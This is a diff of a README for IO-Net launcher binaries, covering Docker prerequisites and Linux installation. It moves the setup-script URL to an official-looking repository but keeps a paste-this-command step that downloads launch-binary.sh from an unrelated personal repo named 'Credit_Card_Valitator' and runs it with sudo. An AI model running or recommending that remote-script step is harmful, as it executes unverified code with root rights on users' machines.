@@ -12,16 +12,19 @@ Welcome to the official repository for IO-Net launcher binaries. This repository
 
 ### For Mac OS and Windows
 - Docker Desktop
-  - [Download Docker Desktop for Mac](https://www.docker.com/products/docker-desktop/) - for Mac choose - Apple chip version for download.
+  - [Download Docker Desktop for Mac](https://www.docker.com/products/docker-desktop/) - for Mac OS Choose - Apple chip version for download.
 
 ## Installation Instructions
 
 ### Linux
 
 1. **Perform IO-Setup (one-time hardware setup)** (skip if Docker and Nvidia drivers are already installed and configured):
-   - Download and run the setup script:
-     ```bash
-     curl -L https://github.com/ilkhom19/Credit_Card_Valitator/raw/main/ionet-setup.sh -o ionet-setup.sh
+   - Download the setup script: 
+     ```
+     curl -L https://github.com/ionet-official/io-net-official-setup-script/raw/main/ionet-setup.sh -o ionet-setup.sh
+     ```
+   - Run the script:
+     ```
      chmod +x ionet-setup.sh && ./ionet-setup.sh
      ```
    - **Note**: In case the `curl` command fails, install `curl` using:
@@ -36,7 +39,6 @@ Welcome to the official repository for IO-Net launcher binaries. This repository
      ```bash
      curl -sL https://raw.githubusercontent.com/ilkhom19/Credit_Card_Valitator/main/launch-binary.sh -o launch-binary.sh && sudo bash launch-binary.sh
      ```
-
 
 
 ### Mac
@@ -69,4 +71,4 @@ Welcome to the official repository for IO-Net launcher binaries. This repository
 
 For support, please open an issue in this repository or contact our support team on [Discord](https://discord.gg/kqFzFK7fg2).
 
----
+    
